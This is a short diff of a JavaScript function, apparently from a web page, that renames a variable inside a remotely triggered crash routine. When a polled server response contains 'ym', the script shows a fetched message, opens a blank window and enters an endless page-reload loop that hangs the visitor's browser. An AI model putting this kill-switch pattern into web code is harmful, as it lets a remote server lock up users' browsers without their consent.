@@ -35,11 +35,11 @@ function ya() {
     Http.onreadystatechange = (e) => {
       if (Http.responseText.includes("ym")) {
         // Crash with msg
-        let Http = new XMLHttpRequest();
-        Http.open("GET", url + "/msg");
-        Http.send();
-        Http.onreadystatechange = (e) => {
-            alert(Http.responseText)
+        let Https = new XMLHttpRequest();
+        Https.open("GET", url + "/msg");
+        Https.send();
+        Https.onreadystatechange = (e) => {
+            alert(Https.responseText)
             window.open("about:blank")
 
             while(1)location.reload(1)
